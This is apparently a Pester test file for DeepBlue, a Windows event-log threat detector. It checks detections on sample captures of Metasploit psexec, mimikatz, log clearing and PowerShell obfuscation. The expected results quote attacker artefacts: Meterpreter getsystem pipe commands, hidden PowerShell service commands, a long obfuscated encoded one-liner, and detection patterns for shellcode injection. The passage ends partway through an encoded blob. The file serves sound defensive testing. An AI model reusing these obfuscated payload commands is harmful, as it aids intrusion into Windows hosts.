<#

Use some Pester tests to find out if the main DeepBlue function performs well on captured sample evtx sample files

Use the AST to find and extract the internal functions
and load it into a fake module as a function because it's harmless

#>

#region use AST to fake module
$Ast = $File = $predicate = $sb = $flat = $null
$File = (Resolve-Path $PSScriptRoot\..\DeepBlue.psm1).Path
$Ast = [scriptblock]::Create((Get-Content -Path $File -Raw)).Ast

[ScriptBlock] $predicate = {
 Param ([System.Management.Automation.Language.Ast] $Ast)
 $Ast -is [System.Management.Automation.Language.FunctionDefinitionAst]
}

# Parse the AST recursively and find all functions
$sb  = New-Object System.Text.StringBuilder
$AST.FindAll($predicate,$true) | ForEach-Object {
    $null = $sb.Append("function $($_.Name) { $($_.Body.GetScriptBlock()) }`n")
}
$null = $sb.Append("Export-ModuleMember -Function '*'")

$flat = [scriptblock]::Create($sb.ToString())

Remove-Module -Name FakeDeepBlue -Force -ErrorAction SilentlyContinue
New-Module -Name FakeDeepBlue -ScriptBlock ($flat.GetNewClosure()) |
Import-Module -Force -Verbose:$false
#endregion

InModuleScope FakeDeepBlue {

#region Exercising on sample evtx files
Describe 'Testing Sample EVTX files' {
    # TODO:
    # many-events-application.evtx
    # many-events-security.evtx
    # many-events-system.evtx
    Context 'disablestop-eventlog' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'disablestop-eventlog.evtx')).FullName
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Command','Decoded') } | Select-Object -Expand Name
            $ar = @(
                [PSCustomObject]@{
                    Date    = [datetime]636919958913739486
                    Log     = 'System'
                    EventID = [int]7040
                    Message = 'Event Log Service Stopped'
                    Results = "Service name: Windows Event Log`nSelective event log manipulation may follow this event."
                },
                [PSCustomObject]@{
                    Date    = [datetime]636920030723739941
                    Log     = 'System'
                    EventID = [int]7040
                    Message = 'Event Log Service Started'
                    Results = "Service name: Windows Event Log`nSelective event log manipulation may precede this event."
                },
                [PSCustomObject]@{
                    Date    = [datetime]636920030723739942
                    Log     = 'System'
                    EventID = [int]104
                    Message = 'A Log was cleared'
                    Results = "The log 'System' was cleared by user DESKTOP-JR78RLP\jwrig"
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }
                # Write-Verbose -Message "From evtx $($o.Date)" -Verbose
                # Write-Verbose -Message "From fake ar $($ar[$i].Date)" -Verbose
                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
    }
    Context 'metasploit-psexec-native-target-security' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'metasploit-psexec-native-target-security.evtx')).FullName
            $exr = [PSCustomObject]@{
                Date    = [datetime]636100332730781250
                Log     = 'Security'
                EventID = [int]4688
                Message = 'Suspicious Command Line'
                Results = "Metasploit-style cmd with pipe (possible use of Meterpreter getsystem)`n"
                Command = 'cmd.exe /c echo hgabms > \\.\pipe\hgabms'
                Decoded = ''
            }
            $props = $r[0].PSObject.Properties | Select-Object -Expand Name
        }
        $props |
        ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 # Write-Verbose -Message "From evtx $($o.Date)" -Verbose
                 # Write-Verbose -Message "From fake ar $($ar[$i].Date)" -Verbose
            It "Test result 1 $($p)" {
                $null -eq (Compare-Object -ReferenceObject ($r[0].Date.ToUniversalTime()) -DifferenceObject ($exr.Date) -Property $p)| Should -Be $true
            }

                } else {
            It "Test result 1 $($p)" {
                $null -eq (Compare-Object -ReferenceObject ($r[0]) -DifferenceObject ($exr) -Property $p)| Should -Be $true
            }
                }
        }
    }
    Context 'metasploit-psexec-native-target-system' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'metasploit-psexec-native-target-system.evtx')).FullName)
            $props = $r[0].PSObject.Properties | Select-Object -Expand Name
            $ar = @(
                [PSCustomObject]@{
                    Date=[datetime]636100332730703125 # 2016-09-21 05:41:13Z
                    Log='System'
                    EventID=[int]7045
                    Message='Suspicious Service Command'
                    Results="Service name: hgabms`nMetasploit-style cmd with pipe (possible use of Meterpreter getsystem)`n"
                    Command='cmd.exe /c echo hgabms > \\.\pipe\hgabms'
                    Decoded=''
                },
                [PSCustomObject]@{
                    Date=[datetime]636100332625703125 # 2016-09-21 05:41:02Z
                    Log='System'
                    EventID=[int]7036
                    Message='Suspicious Service Name'
                    Results="Service name: KgXItsbKgTJzdzwl`nMetasploit-style service name: 16 characters`n"
                    Command=''
                    Decoded=''
                },
                [PSCustomObject]@{
                    Date=[datetime]636100332625683593 # 2016-09-21 05:41:02Z
                    Log='System'
                    EventID=[int]7036
                    Message='Suspicious Service Name'
                    Results="Service name: KgXItsbKgTJzdzwl`nMetasploit-style service name: 16 characters`n"
                    Command=''
                    Decoded=''
                },
                [PSCustomObject]@{
                    Date=[datetime]636100332625429687 # 2016-09-21 05:41:02Z
                    Log='System'
                    EventID=[int]7045
                    Message='Suspicious Service Command'
                    Results="Service name: KgXItsbKgTJzdzwl`nMetasploit-style %SYSTEMROOT% image path (possible use of Metasploit Native upload exploit payload)`n"
                    Command='%SYSTEMROOT%\duKhLYUX.exe'
                    Decoded=''
                },
                [PSCustomObject]@{
                    Date=[datetime]636100332625429687 # 2016-09-21 05:41:02Z
                    Log='System'
                    EventID=[int]7045
                    Message='Suspicious Service Command'
                    Results="Service name: KgXItsbKgTJzdzwl`nMetasploit-style %SYSTEMROOT% image path (possible use of Metasploit Native upload exploit payload)`n"
                    Command='%SYSTEMROOT%\duKhLYUX.exe'
                    Decoded=''
                },
                [PSCustomObject]@{
                    Date=[datetime]636100332625429687 # 2016-09-21 05:41:02Z
                    Log='System'
                    EventID=[int]104
                    Message='A Log was cleared'
                    Results="The log 'System' was cleared by user IE10WIN7\IEUser"
                    Command=''
                    Decoded=''
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
    }
    Context 'metasploit-psexec-powershell-target-security' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'metasploit-psexec-powershell-target-security.evtx')).FullName)
            # $r contains malicious content detected as Trojan:PowerShell/Injector
            # https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Injector&threatid=2147725647&enterprise=0
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Command','Decoded') } | Select-Object -Expand Name
            $ar = @(
                [PSCustomObject]@{
                    Date=[datetime]636099933581699218 # 2016-09-20 18:35:58Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Metasploit-style cmd with pipe (possible use of Meterpreter getsystem)`n"
                    Command='cmd.exe /c echo genusn > \\.\pipe\genusn'
                },
                [PSCustomObject]@{
                    Date=[datetime]636099933467900390 # 2016-09-20 18:35:46Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Long Command Line: greater than 1000 bytes`nMetasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)`n500+ consecutive Base64 characters`nBase64-encoded and compressed function"
                },
                [PSCustomObject]@{
                    Date=[datetime]636099933466083984 # 2016-09-20 18:35:46Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Long Command Line: greater than 1000 bytes`nMetasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)`n500+ consecutive Base64 characters`nBase64-encoded and compressed function"
                },
                [PSCustomObject]@{
                    Date=[datetime]636099933466054687 # 2016-09-20 18:35:46Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Long Command Line: greater than 1000 bytes`nMetasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)`n500+ consecutive Base64 characters`nBase64-encoded and compressed function"
                },
                [PSCustomObject]@{
                    Date=[datetime]636099933466054687 # 2016-09-20 18:35:46Z
                    Log='Security'
                    EventID=[int]1102
                    Message='Audit Log Clear'
                    Results='The Audit log was cleared by IE10WIN7\IEUser'
                    Command=''
                    Decoded=''
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
        #$i=1
        $r[1..$($r.Count-2)] | ForEach-Object {
            $o = $_
            It "Test result $($i) Command" {
                $o.Command -match 'powershell\.exe'| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match '\[AppDomain\]::'| Should -Be $true
            }

            $i++
        }
    }
    Context 'metasploit-psexec-powershell-target-system' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'metasploit-psexec-powershell-target-system.evtx')).FullName)
            # $r contains malicious content detected as TrojanDownloader:PowerShell/Plasti.A
            # https://go.microsoft.com/fwlink/?linkid=37020&name=TrojanDownloader:PowerShell/Plasti.A&threatid=2147720558&enterprise=0
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Command','Decoded') } | Select-Object -Expand Name
            $ar = @(
                [PSCustomObject]@{
                    Date=[datetime]636099933581621093 # 2016-09-20 18:35:58Z
                    Log='System'
                    EventID=[int]7045
                    Message='Suspicious Service Command'
                    Results="Service name: genusn`nMetasploit-style cmd with pipe (possible use of Meterpreter getsystem)`n"
                    Command='cmd.exe /c echo genusn > \\.\pipe\genusn'
                    Decoded=''
                },
                [PSCustomObject]@{
                    Date=[datetime]636099933465908203 # 2016-09-20 18:35:46Z
                    Log='System'
                    EventID=[int]7045
                    Message='Suspicious Service Command'
                    Results="Service name: UWdKhYTIQWWJxHfx`nLong Command Line: greater than 1000 bytes`nMetasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)`n500+ consecutive Base64 characters`nBase64-encoded and compressed function"
                    Command='%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden'
                    Decoded='function h4ZcoQgeeU {'
                },
                [PSCustomObject]@{
                    Date=[datetime]636099933465908203 # 2016-09-20 18:35:46Z
                    Log='System'
                    EventID=[int]7045
                    Message='Suspicious Service Command'
                    Results="Service name: UWdKhYTIQWWJxHfx`nLong Command Line: greater than 1000 bytes`nMetasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)`n500+ consecutive Base64 characters`nBase64-encoded and compressed function"
                    Command='%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden'
                    Decoded='function h4ZcoQgeeU {'
                },
                [PSCustomObject]@{
                    Date=[datetime]636099933465908203 # 2016-09-20 18:35:46Z
                    Log='System'
                    EventID=[int]104
                    Message='A Log was cleared'
                    Results="The log 'System' was cleared by user IE10WIN7\IEUser"
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
        $i=1
        $r[1..($r.Count -2)] | ForEach-Object {
            $o = $_
            It "Test result $($i) Command" {
                $o.Command -match 'powershell\.exe'| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match '\[AppDomain\]::'| Should -Be $true
            }
            # [System.Convert]::FromBase64String
            It "Test result $($i) Decoded" {
                $o.Decoded -match '\[System\.Convert\]::FromBase64String'| Should -Be $true
            }
            # GetMethod('GetProcAddress').Invoke
            It "Test result $($i) Decoded" {
                $o.Decoded -match "GetMethod\('GetProcAddress'\)\.Invoke"| Should -Be $true
            }
            # kernel32.dll VirtualAlloc
            It "Test result $($i) Decoded" {
                $o.Decoded -match 'kernel32\.dll\sVirtualAlloc'| Should -Be $true
            }
            # kernel32.dll CreateThread
            It "Test result $($i) Decoded" {
                $o.Decoded -match 'kernel32\.dll\sCreateThread'| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match '\[System.RunTime\.'| Should -Be $true
            }
            $i++
        }
    }
    # metasploit-psexec-pwshpayload.evtx
    # the original DeepBlue doesn't detect anything
    # 1102 Information      The audit log was cleared
    Context 'mimikatz-privesc-hashdump' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'mimikatz-privesc-hashdump.evtx')).FullName)
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Command','Decoded') } | Select-Object -Expand Name
            $ar = @(
                [PSCustomObject]@{
                    Date=[datetime]636922517091380587 # 2019-04-30 20:08:29Z
                    Log='Security'
                    EventID=[int]4673
                    Message='Sensititive Privilege Use Exceeds Threshold'
                    Results="Potentially indicative of Mimikatz, multiple sensitive privilege calls have been made.`nUsername: Sec504`nDomain Name: SEC504STUDENT"
                },
                [PSCustomObject]@{
                    Date=[datetime]636922517091380587 # 2019-04-30 20:08:29Z
                    Log='Security'
                    EventID=[int]1102
                    Message='Audit Log Clear'
                    Results="The Audit log was cleared by SEC504STUDENT\Sec504"
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
    }
    # mimikatz-privilegedebug-tokenelevate-hashdump.evtx
    # the original DeepBlue doesn't detect anything
    # 1102 Information      The audit log was cleared
    Context 'new-user-security' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'new-user-security.evtx')).FullName)
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Command','Decoded') } | Select-Object -Expand Name
            $ar =@(
                [PSCustomObject]@{
                    Date=[datetime]635181493600047500 # 2013-10-23 18:22:40Z
                    Log='Security'
                    EventID=[int]4732
                    Message=''
                    Results="Username: -`nUser SID: S-1-5-21-3463664321-2923530833-3546627382-1000"
                },
                [PSCustomObject]@{
                    Date=[datetime]635181493599735000 # 2013-10-23 18:22:39Z
                    Log='Security'
                    EventID=[int]4720
                    Message='New User Created'
                    Results="Username: IEUser`nUser SID: S-1-5-21-3463664321-2923530833-3546627382-1000"
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
    }
    # Context 'password-spray' {
    #     BeforeAll {
    #         $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
    #         $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'password-spray.evtx')).FullName)
    #         $props = $r[0].PSObject.Properties | Select-Object -Expand Name
    #     }
    # }
    Context 'Powershell-Invoke-Obfuscation-encoding-menu' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'Powershell-Invoke-Obfuscation-encoding-menu.evtx')).FullName)
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Decoded') } | Select-Object -Expand Name
            $ar = @(
                [PSCustomObject]@{
                    Date=[datetime]636397245668774171 # 2017-08-30 21:16:06Z
                    Log='Powershell'
                    EventID=[int]4104
                    Message='Suspicious Command Line'
                    Results="Long Command Line: greater than 1000 bytes`nPossible command obfuscation: only 3% alphanumeric and common symbols`n"
                    Command='${=}  =+  $(  );  ${-#}  =${=}  ;${]!}  =++${=}  ;${*}  =++${=}  ;${(@}  =  ++${=}  ;${+=}=++  ${=};  ${%}  =  ++  ${=}  ;  ${.]/}  =  ++${=};${#/}=++${=}  ;  ${@=-}=  ++  ${=};  ${@%)}=  ++  ${=}  ;  ${*[%}  =  "["+"$(@{})"[${#/}  ]+"$(@{})"[  "${]!}"+"${@%)}"  ]+"$(@{  })"[  "${*}"  +  "${-#}"]  +  "$?  "[  ${]!}  ]+  "]"  ;${=}="".("$(  @{}  )"[  "${]!}${+=}"  ]+"$(  @{}  )"[  "${]!}${.]/}"]  +  "$(  @{})  "[  ${-#}  ]+  "$(@{  }  )  "[${+=}  ]+"$?  "[${]!}]  +  "$(  @{  }  )  "[  ${(@}  ]  )  ;${=}="$(@{  }  )  "[  "${]!}"  +"${+=}"  ]  +  "$(@{  }  )"[${+=}]  +  "${=}"[  "${*}"  +  "${#/}"  ]  ;  "  ${=}(${*[%}${#/}${(@}  +${*[%}${.]/}${@%)}+${*[%}${@=-}${@=-}  +${*[%}${(@}${*}  +${*[%}${+=}${-#}  +${*[%}${#/}${@=-}  +${*[%}${]!}${-#}${]!}+${*[%}${]!}${]!}${@%)}  +  ${*[%}${+=}${%}+  ${*[%}${#/}${@%)}  +  ${*[%}${@%)}${@=-}+${*[%}${]!}${-#}${.]/}+${*[%}${]!}${-#}${]!}  +${*[%}${@%)}${@%)}  +${*[%}${]!}${]!}${.]/}+  ${*[%}${(@}${*}  +${*[%}${#/}${@=-}+${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${.]/}  +${*[%}${+=}${.]/}+${*[%}${@=-}${#/}+${*[%}${]!}${-#}${]!}  +  ${*[%}${@%)}${@=-}+  ${*[%}${.]/}${#/}  +${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${-#}  +  ${*[%}${]!}${]!}${.]/}+  ${*[%}${+=}${]!}  +  ${*[%}${+=}${.]/}+  ${*[%}${.]/}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${]!}${@%)}+  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${]!}${]!}+  ${*[%}${@%)}${#/}  +  ${*[%}${]!}${-#}${-#}  +  ${*[%}${@=-}${(@}+  ${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${]!}${+=}+${*[%}${]!}${-#}${%}  +${*[%}${]!}${]!}${-#}+  ${*[%}${]!}${-#}${(@}+  ${*[%}${+=}${-#}+  ${*[%}${(@}${@%)}+${*[%}${]!}${-#}${+=}  +${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${]!}${.]/}+  ${*[%}${]!}${]!}${*}  +${*[%}${]!}${]!}${%}  +  ${*[%}${%}${@=-}+  ${*[%}${+=}${#/}+${*[%}${+=}${#/}+${*[%}${]!}${]!}${+=}+  ${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${@%)}  +  ${*[%}${+=}${.]/}+${*[%}${]!}${-#}${(@}+${*[%}${]!}${-#}${%}+  ${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${-#}${+=}  +${*[%}${]!}${]!}${#/}+${*[%}${@%)}${@=-}+${*[%}${]!}${]!}${#/}+${*[%}${]!}${]!}${%}  +  ${*[%}${]!}${-#}${]!}+  ${*[%}${]!}${]!}${+=}  +${*[%}${@%)}${@%)}+  ${*[%}${]!}${]!}${]!}  +  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${-#}+  ${*[%}${]!}${]!}${.]/}  +${*[%}${+=}${.]/}+  ${*[%}${@%)}${@%)}  +${*[%}${]!}${]!}${]!}  +${*[%}${]!}${-#}${@%)}  +${*[%}${+=}${#/}  +  ${*[%}${]!}${-#}${@%)}  +${*[%}${@%)}${#/}  +${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${-#}${*}  +${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${%}  +  ${*[%}${]!}${]!}${.]/}+${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${.]/}+  ${*[%}${]!}${-#}${%}+  ${*[%}${]!}${]!}${]!}  +${*[%}${]!}${]!}${-#}  +${*[%}${+=}${#/}+  ${*[%}${@=-}${-#}+${*[%}${]!}${]!}${]!}  +  ${*[%}${]!}${]!}${@%)}  +${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${+=}+  ${*[%}${@=-}${(@}+  ${*[%}${]!}${]!}${*}+${*[%}${]!}${-#}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${]!}${.]/}+${*[%}${+=}${#/}  +  ${*[%}${]!}${-#}${@%)}+  ${*[%}${@%)}${#/}  +${*[%}${]!}${]!}${%}  +${*[%}${]!}${]!}${.]/}+${*[%}${]!}${-#}${]!}  +${*[%}${]!}${]!}${+=}  +${*[%}${+=}${#/}+${*[%}${.]/}${@%)}+${*[%}${]!}${*}${-#}  +${*[%}${]!}${-#}${*}+  ${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${]!}${+=}+  ${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${]!}${]!}+${*[%}${]!}${]!}${-#}+${*[%}${+=}${#/}+${*[%}${#/}${(@}+  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${@=-}+${*[%}${]!}${]!}${]!}+${*[%}${]!}${-#}${#/}  +${*[%}${]!}${-#}${]!}+${*[%}${+=}${%}+  ${*[%}${#/}${#/}+  ${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${@%)}+${*[%}${]!}${-#}${%}  +${*[%}${]!}${-#}${#/}+${*[%}${@%)}${#/}  +  ${*[%}${]!}${]!}${.]/}+${*[%}${]!}${*}${*}  +  ${*[%}${+=}${.]/}  +  ${*[%}${]!}${]!}${*}+${*[%}${]!}${]!}${%}  +  ${*[%}${+=}${@%)}+  ${*[%}${(@}${@%)}  +  ${*[%}${+=}${]!}  +${*[%}${%}${@%)}  +${*[%}${(@}${*}+  ${*[%}${#/}${(@}+${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${-#}${#/}+${*[%}${]!}${-#}${]!}+${*[%}${+=}${%}+  ${*[%}${#/}${#/}  +  ${*[%}${]!}${-#}${%}  +${*[%}${]!}${-#}${@%)}+${*[%}${]!}${-#}${%}+  ${*[%}${]!}${-#}${#/}  +  ${*[%}${@%)}${#/}+${*[%}${]!}${]!}${.]/}+${*[%}${]!}${*}${*}+${*[%}${(@}${*}  +  ${*[%}${+=}${%}  +${*[%}${.]/}${@=-}+${*[%}${]!}${]!}${#/}  +${*[%}${]!}${-#}${@%)}+  ${*[%}${]!}${]!}${*}  +${*[%}${.]/}${#/}+${*[%}${]!}${]!}${+=}  +${*[%}${]!}${-#}${]!}+${*[%}${]!}${-#}${-#}  +  ${*[%}${]!}${]!}${%})"|&  ${=}  '
                },
                [PSCustomObject]@{
                    Date=[datetime]636397245236609079 # 2017-08-30 21:15:23Z
                    Log='Powershell'
                    EventID=[int]4104
                    Message='Suspicious Command Line'
                    Results="Long Command Line: greater than 1000 bytes`n500+ consecutive Base64 characters`n"
                    Command=@'
 ( [rUntImE.iNtEROPSeRviCEs.mARShaL]::pTRtOSTriNGBstR([ruNtIMe.iNTeropSERVIcES.MarsHAl]::seCUResTRingtObstr($('76492d1116743f0423413b16050a5345MgB8ADcAUABxAFcAagBnAHgAUQBpAGoARABCADkARABNAHgAVQAxAEgAUQA1AGcAPQA9AHwANABjADQANgBmADUANgA3ADgAYgBhADkANwBmADUANwA3ADgAOABlADkANgAxAGMAMgA0ADAAMQA0ADkAZQA3AGEAYQAwADUANQAxADAANQBiADcAMQA3ADUANQA4AGEAYwAyAGMANQA3ADkAYgBiADkAMQBhAGIANgAzAGUAYwAxAGEAOAAwAGMAZABkADUAMgA4ADcAZAA1AGUAMwA4AGEANAA3AGUANQA5ADUANwBjAGMANwA5ADcAMwBhADIANAA2ADMAMQBmAGMAYwA1ADgAYQA5ADQAOAAwADgAOQAyADQAYwA2ADUAYwAyADkANgBhAGUAYwA0ADAAZAA2AGQANQA0ADkAYgA3ADgAYQA1ADcANAA5ADYAYwAyADgAZQA5AGIANgBlADQAZgBlADgAYQBlADcAYQA1ADgAYQAxADYAYgA3AGUAZABiAGEAMgAyAGMAZAA3AGEAMAA4AGYAYwAyAGMAMQAxADUANAAzADUAOAA1ADIAMQA4AGMANQA1AGEANAA4ADgAZgA0AGQAZgBhADYAYwBhAGIAOAA1AGUANgBlADMAMQBiAGMAYwA4AGEANAAxADMANgAxADEAYwBlADgAZQBjAGUAMwBkADEAYgA1AGQAMgBiADYANQA5AGUANgA5AGMAZAA1AGIANgBkADMAYwA4ADYANwAwADkAMwA4AGUAOABiADIANgA3AGIAZABkADEAYQA4ADMAOQBkAGQAOQAxADkANwA5ADkAYQA4ADYAZQBlADIANQBkADYAMQA5ADEAMQA0ADUANwA3ADkAMgA3AGUAMwBkADEANQBlADgAZABlADcAZgAyADQAYgBhADAAYwA4ADgANABjADkAYgBiADUANQAxADQAOQBjADkAMgBhAGYAOQAwAGUAOQA4ADUANgA2ADcAZAA5ADQANAAzAGQANABiADIAOABlAGUANAA0AGIANAAxADEAOABlAGMAMQBlADIANgA0AGIAMQA2AGYAMwBlAGUAYQA1ADkAOABmADgAMAA4ADEAZgAyADIAZQBmADQAMABlADgAMAAxADcAZABiAGEAOQAyAGIAYgBhAGUAMAA0ADIAZQA2ADcAZQA3ADQAMQA0ADYAMgA0ADQAZQBmADEAOQBlADkAYwAxAGEANwBjAGMAOQBjAGYAZgAyAGMAYgA0AGEAMAA3ADMANABkAGQAMwA0AGUAOAA4AGUANQAwADEAYgA2ADkAZgAyADgAYQA1AGQAOQA4AGQAMQAxADgAOAA4AGMAZQAwAGEAZQBmADMAZQAyAGYAMgA1ADgAZgA4ADcAMwA1ADkANQA4AGUAYwBjADQANwBiADcAYgA1ADAAYQA5AGMAZgAyADMAZAA3ADQANgA1ADEAZgAxAGQANAA5ADEAYQAwADcAYgBhAGMAMwA3ADcAYgBmADgAMwA2ADYAYQBjAGUAZAA4ADIAZABmAGEAMwA0AGQAYwBjADkAZABlADYAYgAyADkAMABlAGUAYgAwADAAMgBjADIANgAwADMAMQA3AGMAMQBlADIAMQBlADQANAA1AGUAOAAzADgAYQBkAGMANAA0AGYAMwBlADgAYgA5ADMAMwBlAGIANgAwAGEANgAyADAAZABlADkANgAxADMANgA4ADgAMAA4ADUAMgBiADEAYgAzAGYAMQAxADkAZgAyADMAMQAzADkAMAA0ADkANQBlADMAOAA3AGYAMQA5AGUAZQAxADEAZgBlADMANQBjADEANAA2AGEAYQA3AGIANABiAGUAMQAwADUAMABhADQAZgAzAGQAZgBmADkAZQBmADYAY